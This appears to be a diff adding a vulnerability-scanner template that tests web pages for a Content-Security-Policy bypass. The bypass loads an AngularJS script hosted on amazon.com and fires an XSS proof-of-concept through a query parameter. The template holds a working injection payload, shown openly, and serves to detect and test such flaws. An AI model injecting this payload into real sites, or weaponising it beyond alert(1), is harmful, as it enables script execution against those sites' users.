@@ -1,0 +1,47 @@
+id: amazon-csp-xss
+
+info:
+  name: Content-Security-Policy Bypass via Amazon
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L132C9-L132C15
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,amazon
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{injection}}"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: word
+        part: content_security_policy
+        words:
+          - "amazon.com"
+          - "script-src"
+        condition: and
